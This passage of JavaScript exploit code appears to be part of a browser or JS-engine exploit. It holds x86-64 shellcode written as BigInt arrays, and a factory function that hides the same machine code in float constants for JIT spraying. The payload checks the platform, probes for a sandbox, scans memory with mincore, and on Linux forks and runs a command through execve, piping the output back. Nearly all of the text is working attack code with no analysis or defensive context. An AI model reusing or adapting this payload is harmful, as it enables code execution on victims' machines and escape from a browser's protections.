    0x01010101cd0aeb58n, // 0x0a5c: POP rax
    0xce06eb0000021de9n, // 0x0a69: JMP :Label('return') => 0x0c8b
    // LinuxSandbox [0x0a76]:
    0x0101cf08ebc78948n, // 0x0a76: MOV rdi, rax
    0xd006eb00000066b8n, // 0x0a83: MOV eax, 102
    0x010101d109eb050fn, // 0x0a90: SYSCALL
    0x0101d208ebfb8948n, // 0x0a9d: MOV rbx, rdi
    0xd306eb0000000ab9n, // 0x0aaa: MOV ecx, 10
    // convert_loop [0x0ab7]:
    0x010101d409ebd231n, // 0x0ab7: XOR edx, edx
    0x010101d509ebf1f7n, // 0x0ac4: DIV ecx
    0x0101d608eb30c283n, // 0x0ad1: ADD edx, 48
    0x010101d709eb1389n, // 0x0ade: MOV [rbx], edx
    0x0101d808ebc3ff48n, // 0x0aeb: INC rbx
    0x010101d909ebc085n, // 0x0af8: TEST eax, eax
    0x01010101da0aeb90n, // 0x0b05: NOP
    0x01010101db0aeb90n, // 0x0b12: NOP
    0x05ebffffff92850fn, // 0x0b1f: JNZ :Label('convert_loop') => 0x0ab7
    0x0101dd08ebcbff48n, // 0x0b2c: DEC rbx
    0x0101de08ebda8948n, // 0x0b39: MOV rdx, rbx
    0x0101df08ebf98948n, // 0x0b46: MOV rcx, rdi
    // reverse_loop [0x0b53]:
    0x010101e009eb078an, // 0x0b53: MOV al, [rdi]
    0x010101e109eb1a8an, // 0x0b60: MOV bl, [rdx]
    0x010101e209eb1f88n, // 0x0b6d: MOV [rdi], bl
    0x010101e309eb0288n, // 0x0b7a: MOV [rdx], al
    0x0101e408ebc7ff48n, // 0x0b87: INC rdi
    0x0101e508ebcaff48n, // 0x0b94: DEC rdx
    0x0101e608ebd73948n, // 0x0ba1: CMP rdi, rdx
    0x01010101e70aeb90n, // 0x0bae: NOP
    0x01010101e80aeb90n, // 0x0bbb: NOP
    0x05ebffffff858c0fn, // 0x0bc8: JMP :Label('reverse_loop') => 0x0b53
    0x0101ea08ebd70148n, // 0x0bd5: ADD rdi, rdx
    0x0101eb08ebcf2948n, // 0x0be2: SUB rdi, rcx
    0x0101ec08ebc7ff48n, // 0x0bef: INC rdi
    0x010101ed09ebc931n, // 0x0bfc: XOR ecx, ecx
    0x010101ee09eb0f89n, // 0x0c09: MOV [rdi], ecx
    0x0101ef08ebc7ff48n, // 0x0c16: INC rdi
    0xf006eb0000003fb8n, // 0x0c23: MOV eax, 63
    0x010101f109eb050fn, // 0x0c30: SYSCALL
    0x010101f209ebc031n, // 0x0c3d: XOR eax, eax
    0xf306eb00000180b8n, // 0x0c4a: MOV eax, 384
    0x0101f408ebc70148n, // 0x0c57: ADD rdi, rax
    0x0101f508ebf88948n, // 0x0c64: MOV rax, rdi
    0x010101f609eb406an, // 0x0c71: PUSH 64
    0x01010101f70aeb58n, // 0x0c7e: POP rax
    // return [0x0c8b]:
    0x01010101f80aebc3n, // 0x0c8b: RET
]

cwasmShellcode = [
    0x05eb909090909090n, // 0x0000: SLED 6
// Setup rax to point to the iomem string data
0x010207eb0cc08348n, // 0x000d: ADD rax, 12
0x01010308ebc78948n, // 0x001a: MOV rdi, rax
0x0406eb00000066b8n, // 0x0027: MOV eax, 102
0x0101010509eb050fn, // 0x0034: SYSCALL
0x01010608ebfb8948n, // 0x0041: MOV rbx, rdi
0x0706eb0000000ab9n, // 0x004e: MOV ecx, 10
// convert_loop [0x005b]:
0x0101010809ebd231n, // 0x005b: XOR edx, edx
0x0101010909ebf1f7n, // 0x0068: DIV ecx
0x01010a08eb30c283n, // 0x0075: ADD edx, 48
0x0101010b09eb1389n, // 0x0082: MOV [rbx], edx
0x01010c08ebc3ff48n, // 0x008f: INC rbx
0x0101010d09ebc085n, // 0x009c: TEST eax, eax
0x05ebffffffac850fn, // 0x00a9: JNZ :Label('convert_loop') => 0x005b
0x01010f08ebcbff48n, // 0x00b6: DEC rbx
0x01011008ebda8948n, // 0x00c3: MOV rdx, rbx
0x01011108ebf98948n, // 0x00d0: MOV rcx, rdi
// reverse_loop [0x00dd]:
0x0101011209eb078an, // 0x00dd: MOV al, [rdi]
0x0101011309eb1a8an, // 0x00ea: MOV bl, [rdx]
0x0101011409eb1f88n, // 0x00f7: MOV [rdi], bl
0x0101011509eb0288n, // 0x0104: MOV [rdx], al
0x01011608ebc7ff48n, // 0x0111: INC rdi
0x01011708ebcaff48n, // 0x011e: DEC rdx
0x01011808ebd73948n, // 0x012b: CMP rdi, rdx
0x05ebffffff9f8c0fn, // 0x0138: JMP :Label('reverse_loop') => 0x00dd
0x01011a08ebd70148n, // 0x0145: ADD rdi, rdx
0x01011b08ebcf2948n, // 0x0152: SUB rdi, rcx
0x01011c08ebc7ff48n, // 0x015f: INC rdi
0x0101011d09ebc931n, // 0x016c: XOR ecx, ecx
0x0101011e09eb0f89n, // 0x0179: MOV [rdi], ecx
0x01011f08ebc7ff48n, // 0x0186: INC rdi
0x2006eb0000003fb8n, // 0x0193: MOV eax, 63
0x0101012109eb050fn, // 0x01a0: SYSCALL
0x0101012209ebc031n, // 0x01ad: XOR eax, eax
0x2306eb00000180b8n, // 0x01ba: MOV eax, 384
0x01012408ebc70148n, // 0x01c7: ADD rdi, rax
0x01012508ebf88948n, // 0x01d4: MOV rax, rdi
0x01010101260aeb50n, // 0x01e1: PUSH rax
0x01012708ebff3148n, // 0x01ee: XOR rdi, rdi
0x01010101280aeb57n, // 0x01fb: PUSH rdi
0x2906eb000007ffbfn, // 0x0208: MOV edi, 2047
0x012a07eb24e7c148n, // 0x0215: SHL rdi, 36
0x01012b08ebf63148n, // 0x0222: XOR rsi, rsi
0x01012c08ebc6ff48n, // 0x022f: INC rsi
0x01012d08ebe28948n, // 0x023c: MOV rdx, rsp
// mincore_loop [0x0249]:
0x01012e08ebc93148n, // 0x0249: XOR rcx, rcx
0x2f06eb00010000b9n, // 0x0256: MOV ecx, 65536
0x01013008ebcf0148n, // 0x0263: ADD rdi, rcx
0x3106eb0000001bb8n, // 0x0270: MOV eax, 27
0x0101013209eb050fn, // 0x027d: SYSCALL
0x01013308eb0cc083n, // 0x028a: ADD eax, 12
0x01010101340aeb90n, // 0x0297: NOP
0x01010101350aeb90n, // 0x02a4: NOP
0x05ebffffff92840fn, // 0x02b1: JZ :Label('mincore_loop') => 0x0249
0x01010101370aeb58n, // 0x02be: POP rax
0x01013808ebf98948n, // 0x02cb: MOV rcx, rdi
// rax = -type=re
0x3906eb65723d65b8n, // 0x02d8: MOV eax, 1701985637
0x013a07eb20e0c148n, // 0x02e5: SHL rax, 32
0x05eb7079742d0d48n, // 0x02f2: OR rax, 1887007789
// strstr_loop [0x02ff]:
0x01013c08ebc1ff48n, // 0x02ff: INC rcx
0x01013d08eb118b4cn, // 0x030c: MOV r10, [rcx]
0x01013e08ebc23949n, // 0x0319: CMP r10, rax
0x05ebffffffd3850fn, // 0x0326: JNE :Label('strstr_loop') => 0x02ff
// strstart_loop [0x0333]:
0x01014008ebd2314dn, // 0x0333: XOR r10, r10
0x014107eb01e98348n, // 0x0340: SUB rcx, 1
0x01014208eb118a44n, // 0x034d: MOV r10b, [rcx]
0x01014308ebd28445n, // 0x035a: TEST r10b, r10b
0x05ebffffffc6850fn, // 0x0367: JNZ :Label('strstart_loop') => 0x0333
0x01014508ebc1ff48n, // 0x0374: INC rcx
0x01014608ebc88948n, // 0x0381: MOV rax, rcx
0x0101014709eb5b41n, // 0x038e: POP r11
// strcopy_loop [0x039b]:
0x01014808eb118a44n, // 0x039b: MOV r10b, [rcx]
0x01014908eb138845n, // 0x03a8: MOV [r11], r10b
0x01014a08ebc1ff48n, // 0x03b5: INC rcx
0x01014b08ebc3ff49n, // 0x03c2: INC r11
0x01014c08ebd28445n, // 0x03cf: TEST r10b, r10b
0x05ebffffffb9850fn, // 0x03dc: JNZ :Label('strcopy_loop') => 0x039b
// return [0x03e9]:
0x010101014e0aebc3n, // 0x03e9: RET
];

const shellcodeFuncFactory = (arg) => {
    return new Function(`
        let a = [
            1.0,
            1.9711828988902502e-246, // 00[0x0000 + 0x14]: SLED 0x06 
            1.3633472545860206e-303, // 01[0x0014 + 0x14]: CALL :jit_arg => 0x003c 
            7.7,                     // 02[0x0028 + 0x14]: 7.7 
            // jit_arg [0x003c]:
            7.74860424160716e-304,   // 03[0x003c + 0x14]: POP rax 
            9.14045781812438e-304,   // 04[0x0050 + 0x14]: ADD rax, 15 
            7.755828124570883e-304,  // 05[0x0064 + 0x14]: MOV rax, [rax] 
            7.757608208697643e-304,  // 06[0x0078 + 0x14]: MOV r12d, gs 
            7.759388266932768e-304,  // 07[0x008c + 0x14]: TEST r12, r12 
            1.9308001567107199e-246, // 08[0x00a0 + 0x14]: JZ :Linux => 0x0212 
            // Windows shellcode
            7.762948381712838e-304,  // 09[0x00b4 + 0x14]: MOV r12, rax 
            7.764728441293669e-304,  // 10[0x00c8 + 0x14]: XOR rcx, rcx 
            1.992632063486483e-255,  // 11[0x00dc + 0x14]: MOV(rax, gs:[rcx+0x60]) 
            1.2786019276071405e-303, // 12[0x00f0 + 0x14]: MOV rax, [rax + 32] 
            1.3241716576066217e-303, // 13[0x0104 + 0x14]: MOV cx, [rax + 112] 
            1.3697411918732014e-303, // 14[0x0118 + 0x14]: MOV rax, [rax + 120] 
            // loop [0x012c]:
            7.773649578052338e-304,  // 15[0x012c + 0x17]: MOV r11b, [rax] 
            1.4646036086979737e-303, // 16[0x0143 + 0x17]: MOV [r12], r11b 
            7.777209714099212e-304,  // 17[0x015a + 0x17]: INC rax 
            7.778989773610419e-304,  // 18[0x0171 + 0x17]: INC r12 
            7.780769833227722e-304,  // 19[0x0188 + 0x17]: DEC rcx 
            7.782549892263964e-304,  // 20[0x019f + 0x17]: TEST rcx, rcx 
            5.636005166673215e-232,  // 21[0x01b6 + 0x17]: JNZ :loop => 0x012c 
            2.15839606668993e-202,   // 22[0x01cd + 0x17]: PUSH 256 
            7.748604785156381e-304,  // 23[0x01e4 + 0x17]: POP rax 
            9.27024051991804e-193,   // 24[0x01fb + 0x17]: JMP :return => 0x1016 
            // Linux [0x0212]:
            7.791450187169154e-304,  // 25[0x0212 + 0x17]: MOV r12, rax 
            3.9817067649888705e-183, // 26[0x0229 + 0x17]: PUSH 788529199 
            7.748785486562231e-304,  // 27[0x0240 + 0x17]: XOR edx, edx 
            7.748792439932959e-304,  // 28[0x0257 + 0x17]: XOR esi, esi 
            7.798570427229868e-304,  // 29[0x026e + 0x17]: MOV rdi, rsp 
            7.344641223160765e-164,  // 30[0x0285 + 0x17]: MOV eax, 2 
            7.748813299900444e-304,  // 31[0x029c + 0x17]: SYSCALL 
            7.748605029610308e-304,  // 32[0x02b3 + 0x17]: POP rdi 
            3.11148556989675e-303,   // 33[0x02ca + 0x17]: SHR rax, 63 
            7.748834160045562e-304,  // 34[0x02e1 + 0x17]: TEST eax, eax 
            7.80925078100801e-304,   // 35[0x02f8 + 0x17]: MOV rax, r12 
            5.434719392660526e-232,  // 36[0x030f + 0x17]: JNZ :LinuxSandbox => 0x0cf1 
            // LinuxForkExec [0x0326]:
            7.812810896104721e-304,  // 37[0x0326 + 0x17]: MOV rbx, rax 
            // pipe(link)
            7.748861973389174e-304,  // 38[0x033d + 0x17]: PUSH 0 
            1.637909724925086e-120,  // 39[0x0354 + 0x17]: MOV eax, 22 
            7.818151077184731e-304,  // 40[0x036b + 0x17]: MOV rdi, rsp 
            7.748882833458523e-304,  // 41[0x0382 + 0x17]: SYSCALL 
            7.748889786849226e-304,  // 42[0x0399 + 0x17]: POP r9 
            7.82349125115605e-304,   // 43[0x03b0 + 0x17]: MOV r8d, r9d 
            5.116543788514028e-303,  // 44[0x03c7 + 0x17]: SHR r9, 32 
            1.297685778703029e-91,   // 45[0x03de + 0x17]: MOV eax, 57 
            7.748917600237562e-304,  // 46[0x03f5 + 0x17]: SYSCALL 
            7.830611486652822e-304,  // 47[0x040c + 0x17]: TEST rax, rax 
            5.434719360323314e-232,  // 48[0x0423 + 0x17]: JNZ :parent => 0x0b53 
            // Fork Child
            // dup2(link[1], STDOUT_FILENO);
            2.393807744779638e-72,   // 49[0x043a + 0x17]: MOV eax, 33 
            7.8359516655064e-304,    // 50[0x0451 + 0x17]: MOV rdi, r9 
            1.0281325976722385e-62,  // 51[0x0468 + 0x17]: MOV esi, 1 
            7.748959320372409e-304,  // 52[0x047f + 0x17]: SYSCALL 
            // close(link[0])
            4.415795882954259e-53,   // 53[0x0496 + 0x17]: MOV eax, 3 
            7.843071901004825e-304,  // 54[0x04ad + 0x17]: MOV rdi, r8 
            7.748980180439832e-304,  // 55[0x04c4 + 0x17]: SYSCALL 
            // close(link[1])
            1.2429360433135608e-38,  // 56[0x04db + 0x17]: MOV eax, 3 
            7.84841207911404e-304,   // 57[0x04f2 + 0x17]: MOV rdi, r9 
            7.749001040507256e-304,  // 58[0x0509 + 0x17]: SYSCALL 
            7.749007993940621e-304,  // 59[0x0520 + 0x17]: XOR eax, eax 
            1.0233087576264136e-302, // 60[0x0537 + 0x17]: SHL rax, 32 
            1.0597642979848702e-302, // 61[0x054e + 0x17]: OR rax, 0 
            7.748605844456667e-304,  // 62[0x0565 + 0x17]: PUSH rax 
            7.749035807363853e-304,  // 63[0x057c + 0x17]: XOR eax, eax 
            1.1716828729060594e-302, // 64[0x0593 + 0x17]: SHL rax, 32 
            1.2445939536229727e-302, // 65[0x05aa + 0x17]: OR rax, 0 
            7.748605953102852e-304,  // 66[0x05c1 + 0x17]: PUSH rax 
            1190608367242222.0,      // 67[0x05d8 + 0x17]: MOV eax, 1752379183 
            1.4633277536883153e-302, // 68[0x05ef + 0x17]: SHL rax, 32 
            5.521532981865863e-232,  // 69[0x0606 + 0x17]: OR rax, 1852400175 
            7.748606061749036e-304,  // 70[0x061d + 0x17]: PUSH rax 
            7.748606088910589e-304,  // 71[0x0634 + 0x17]: PUSH rsp 
            7.749098387523046e-304,  // 72[0x064b + 0x17]: POP r8 
            7.749105340921931e-304,  // 73[0x0662 + 0x17]: XOR eax, eax 
            1.9007950748616992e-302, // 74[0x0679 + 0x17]: SHL rax, 32 
            1.9737061555786124e-302, // 75[0x0690 + 0x17]: OR rax, 0 
            7.748606224718313e-304,  // 76[0x06a7 + 0x17]: PUSH rax 
            7.749133154345162e-304,  // 77[0x06be + 0x17]: XOR eax, eax 
            2.192439955643955e-302,  // 78[0x06d5 + 0x17]: SHL rax, 32 
            5.434720464218838e-232,  // 79[0x06ec + 0x17]: OR rax, 25389 
            7.748606333364497e-304,  // 80[0x0703 + 0x17]: PUSH rax 
            7.74860636052605e-304,   // 81[0x071a + 0x17]: PUSH rsp 
            7.749167921081539e-304,  // 82[0x0731 + 0x17]: POP r9 
            7.74917487448001e-304,   // 83[0x0748 + 0x17]: XOR eax, eax 
            2.9266555073766306e-302, // 84[0x075f + 0x17]: SHL rax, 32 
            3.072477668810457e-302,  // 85[0x0776 + 0x17]: OR rax, 0 
            7.748606496333774e-304,  // 86[0x078d + 0x17]: PUSH rax 
            7.749202687903241e-304,  // 87[0x07a4 + 0x17]: XOR eax, eax 
            3.5099452689411424e-302, // 88[0x07bb + 0x17]: SHL rax, 32 
            5.481420905839734e-232,  // 89[0x07d2 + 0x17]: OR rax, 996502889 
            7.748606604979959e-304,  // 90[0x07e9 + 0x17]: PUSH rax 
            4.691286550393857e+130,  // 91[0x0800 + 0x17]: MOV eax, 1953527087 
            4.093235030505654e-302,  // 92[0x0817 + 0x17]: SHL rax, 32 
            5.5129026016729625e-232, // 93[0x082e + 0x17]: OR rax, 1668248176 
            7.748606713626143e-304,  // 94[0x0845 + 0x17]: PUSH rax 
            8.65335529656831e+149,   // 95[0x085c + 0x17]: MOV eax, 790656097 
            4.686731491624238e-302,  // 96[0x0873 + 0x17]: SHL rax, 32 
            5.51265930234393e-232,   // 97[0x088a + 0x17]: OR rax, 1663056741 
            7.748606822272328e-304,  // 98[0x08a1 + 0x17]: PUSH rax 
            1.5963620065430204e+169, // 99[0x08b8 + 0x17]: MOV eax, 1952539680 
            5.853311014753261e-302,  // 100[0x08cf + 0x17]: SHL rax, 32 
            5.481407849057483e-232,  // 101[0x08e6 + 0x17]: OR rax, 996224288 
            7.748606930918512e-304,  // 102[0x08fd + 0x17]: PUSH rax 
            2.94472842739604e+188,   // 103[0x0914 + 0x17]: MOV eax, 1701667182 
            7.019890537882285e-302,  // 104[0x092b + 0x17]: SHL rax, 32 
            5.526812217074011e-232,  // 105[0x0942 + 0x17]: OR rax, 1965046628 
            7.748607039564697e-304,  // 106[0x0959 + 0x17]: PUSH rax 
            5.432153399109866e+207,  // 107[0x0970 + 0x17]: MOV eax, 2003836987 
            8.186470061011308e-302,  // 108[0x0987 + 0x17]: SHL rax, 32 
            5.5144688009486425e-232, // 109[0x099e + 0x17]: OR rax, 1701667182 
            7.748607148210881e-304,  // 110[0x09b5 + 0x17]: PUSH rax 
            1.0020527358535284e+227, // 111[0x09cc + 0x17]: MOV eax, 1953722216 
            9.373462983248475e-302,  // 112[0x09e3 + 0x17]: SHL rax, 32 
            5.460062427774999e-232,  // 113[0x09fa + 0x17]: OR rax, 540763241 
            7.748607256857066e-304,  // 114[0x0a11 + 0x17]: PUSH rax 
            7.748607284018618e-304,  // 115[0x0a28 + 0x17]: PUSH rsp 
            7.74940433517942e-304,   // 116[0x0a3f + 0x17]: POP r10 
            7.749411288497993e-304,  // 117[0x0a56 + 0x17]: PUSH 0 
            7.74941824188772e-304,   // 118[0x0a6d + 0x17]: PUSH r10 
            7.749425195243113e-304,  // 119[0x0a84 + 0x17]: PUSH r9 
            7.749432148598507e-304,  // 120[0x0a9b + 0x17]: PUSH r8 
            7.748607446987895e-304,  // 121[0x0ab2 + 0x17]: PUSH rsp 
            7.749446055314267e-304,  // 122[0x0ac9 + 0x17]: POP r10 
            6.289326397107377e+284,  // 123[0x0ae0 + 0x17]: MOV eax, 59 
            7.967676038672725e-304,  // 124[0x0af7 + 0x17]: MOV rsi, r10 
            7.969456081633185e-304,  // 125[0x0b0e + 0x17]: MOV rdi, [rsi] 
            7.971236156385459e-304,  // 126[0x0b25 + 0x17]: XOR rdx, rdx 
            7.749480822057997e-304,  // 127[0x0b3c + 0x17]: SYSCALL 
            // parent [0x0b53]:
            // Fork Parent
            // close(link[1])
            -2.3527331252921425e-308, // 128[0x0b53 + 0x17]: MOV eax, 3 
            7.976576333364055e-304,  // 129[0x0b6a + 0x17]: MOV rdi, r9 
            7.74950168212542e-304,   // 130[0x0b81 + 0x17]: SYSCALL 
            -6.622355017937106e-294, // 131[0x0b98 + 0x17]: MOV edx, 4096 
            // read [0x0baf]:
            // read(link[0], rbx, 4096)
            7.981916508996497e-304,  // 132[0x0baf + 0x17]: XOR rax, rax 
            7.98369656886248e-304,   // 133[0x0bc6 + 0x17]: MOV rdi, r8 
            7.985476630389574e-304,  // 134[0x0bdd + 0x17]: MOV rsi, rbx 
            7.74953644890446e-304,   // 135[0x0bf4 + 0x17]: SYSCALL 
            7.989036745642126e-304,  // 136[0x0c0b + 0x17]: ADD rbx, rax 
            7.749550355694449e-304,  // 137[0x0c22 + 0x17]: SUB edx, eax 
            7.992596863552146e-304,  // 138[0x0c39 + 0x17]: TEST rax, rax 
            5.636005165595308e-232,  // 139[0x0c50 + 0x17]: JNZ :read => 0x0baf 
            // close(link[0])
            -1.4768345183673037e-250, // 140[0x0c67 + 0x17]: MOV eax, 3 
            7.997937041556926e-304,  // 141[0x0c7e + 0x17]: MOV rdi, r8 
            7.749585122395114e-304,  // 142[0x0c95 + 0x17]: SYSCALL 
            -4.156919616657161e-236, // 143[0x0cac + 0x17]: PUSH 128 
            7.748608071703462e-304,  // 144[0x0cc3 + 0x17]: POP rax 
            -1.785383380631091e-226, // 145[0x0cda + 0x17]: JMP :return => 0x1016 
            // LinuxSandbox [0x0cf1]:
            8.006837336990948e-304,  // 146[0x0cf1 + 0x17]: MOV rdi, rax 
            -7.668163230335157e-217, // 147[0x0d08 + 0x17]: MOV eax, 102 
            7.749626842529961e-304,  // 148[0x0d1f + 0x17]: SYSCALL 
            8.012177519768555e-304,  // 149[0x0d36 + 0x17]: MOV rbx, rdi 
            -2.1583960666614224e-202, // 150[0x0d4d + 0x17]: MOV ecx, 10 
            // convert_loop [0x0d64]:
            7.749647702682402e-304,  // 151[0x0d64 + 0x17]: XOR edx, edx 
            7.749654656051379e-304,  // 152[0x0d7b + 0x17]: DIV ecx 
            8.01929773460124e-304,   // 153[0x0d92 + 0x17]: ADD edx, 48 
            7.749668562670808e-304,  // 154[0x0da9 + 0x17]: MOV [rbx], edx 
            8.022857868396706e-304,  // 155[0x0dc0 + 0x17]: INC rbx 
            7.749682469454117e-304,  // 156[0x0dd7 + 0x17]: TEST eax, eax 
            7.748608424803653e-304,  // 157[0x0dee + 0x17]: NOP 
            7.748608451965199e-304,  // 158[0x0e05 + 0x17]: NOP 
            5.636005164517401e-232,  // 159[0x0e1c + 0x17]: JNZ :convert_loop => 0x0d64 
            8.031758164679534e-304,  // 160[0x0e33 + 0x17]: DEC rbx 
            8.03353822530893e-304,   // 161[0x0e4a + 0x17]: MOV rdx, rbx 
            8.03531828768483e-304,   // 162[0x0e61 + 0x17]: MOV rcx, rdi 
            // reverse_loop [0x0e78]:
            7.749731142868107e-304,  // 163[0x0e78 + 0x17]: MOV al, [rdi] 
            7.749738096231789e-304,  // 164[0x0e8f + 0x17]: MOV bl, [rdx] 
            7.749745049589666e-304,  // 165[0x0ea6 + 0x17]: MOV [rdi], bl 
            7.749752002933455e-304,  // 166[0x0ebd + 0x17]: MOV [rdx], al 
            8.044218577862775e-304,  // 167[0x0ed4 + 0x17]: INC rdi 
            8.04599863726788e-304,   // 168[0x0eeb + 0x17]: DEC rdx 
            8.047778697651921e-304,  // 169[0x0f02 + 0x17]: CMP rdi, rdx 
            5.636005165596589e-232,  // 170[0x0f19 + 0x17]: JMP :reverse_loop => 0x0e78 
            8.051338815802324e-304,  // 171[0x0f30 + 0x17]: ADD rdi, rdx 
            8.053118874056909e-304,  // 172[0x0f47 + 0x17]: SUB rdi, rcx 
            8.05489893238361e-304,   // 173[0x0f5e + 0x17]: INC rdi 
            7.749807629862253e-304,  // 174[0x0f75 + 0x17]: XOR ecx, ecx 
            7.749814583141115e-304,  // 175[0x0f8c + 0x17]: MOV [rdi], ecx 
            8.060239109644027e-304,  // 176[0x0fa3 + 0x17]: INC rdi 
            -2.3938077447834984e-72, // 177[0x0fba + 0x17]: MOV eax, 63 
            7.749835443204196e-304,  // 178[0x0fd1 + 0x17]: SYSCALL 
            7.749842396584604e-304,  // 179[0x0fe8 + 0x17]: PUSH 64 
            7.748609049519123e-304,  // 180[0x0fff + 0x17]: POP rax 
            // return [0x1016]:
            7.748609076680842e-304,  // 181[0x1016 + 0x17]: RET 
        ];
        return a[0];
    `.replace('7.7', arg));
}
